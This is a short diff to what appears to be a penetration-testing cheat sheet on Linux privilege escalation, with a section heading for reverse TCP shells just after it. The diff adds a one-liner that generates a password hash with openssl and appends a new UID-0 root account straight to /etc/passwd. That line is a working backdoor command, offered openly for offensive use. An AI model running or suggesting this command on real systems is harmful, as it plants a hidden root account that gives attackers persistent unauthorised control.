@@ -182,6 +182,9 @@ openssl passwd -1 -salt user password (Thanks to @iilegacyyii)
 
 Adding your entry
 username:$1$new$hash:0:0:root:/root:/bin/bash
+
+One Liner (Another suggestion from @iiLegacyyii
+echo "privescme:$(openssl passwd -1 -salt privescsalt privescme):0:0:/root:/bin/bash" >> /etc/passwd
 ```
 
 ## [reverse TCP Shell's]
